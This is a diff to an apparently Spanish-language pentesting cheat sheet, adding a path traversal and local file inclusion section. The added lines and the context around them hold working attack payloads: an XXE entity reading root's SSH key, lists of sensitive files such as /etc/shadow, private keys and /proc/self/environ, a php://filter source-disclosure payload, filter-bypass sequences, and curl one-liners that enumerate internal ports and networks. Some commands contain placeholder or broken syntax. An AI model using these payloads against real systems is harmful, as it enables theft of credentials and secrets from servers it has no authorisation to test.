@@ -71,6 +71,7 @@
         - [Ferobuster](#ferobuster)
 		- [WPScan](#wpscan)
 		- [XML External Entity (XXE)](#xml-external-entity-xxe)
+  		- [Path Traversal](#path-traversal)
 	- [Database Analysis](#database-analysis)
  		- [impacket-mssqlclient](#impacket-mssqlclient)
 		- [MongoDB](#mongodb)
@@ -3445,6 +3446,66 @@ Content-Length: 136
 
 ```c
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+```
+#### Path Traversal
+
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+List
+```c
+/home/USER/.ssh/.id_rsa
+/etc/passwd
+/etc/shadow
+/etc/login.def
+/proc/net/tcp puertos internos de la maquina
+cat tcp.txt| awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=: | sort -u
+listar puertos internos abiertos de la maquina
+curl -s "http://=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}'  FS=":" | sort -u
+en hexadecimal
+```
+
+con python3 → 0x0016
+Mas opciones en -> https://github.com/carlospolop/Auto_Wordlists
+
+Si es PHP devuelve el output como base64
+
+```c
+/index.php?file=php://filter/convert.base64-encode/resource=FILE.php
+```
+
+Procesos de la maquina
+```c
+/proc/sched_debug
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/cwd current working directory
+```
+
+ruta para ver las redes internas
+
+```c
+curl -s "http://=/proc/net/fib_trie" |grep -i "host local" -B 1 | grep -oP '\d{1,3}\d{1,3}\d{1,3}\d{1,3}' | sort -u
+```
+
+```c
+for port in $(curl); do echo "[port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
+```
+
+Para metodo de LFI
+
+Probar con
+....//....//....//
+para ver si hay sanitizacion de ../
+Probar con Unicode https://jlajara.gitlab.io/Bypass_WAF_Unicode https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability
+
+niginx paths
+
+```c
+/etc/nginx
+/etc/nginx/nginx.conf/etc/nginx/nginx.conf
+/etc/nginx/sites-available/
+/etc/nginx/sites-enabled/
+/var/log/nginx/access.log
+/var/log/nginx/error.log
 ```
 
 ##### Shells on Web
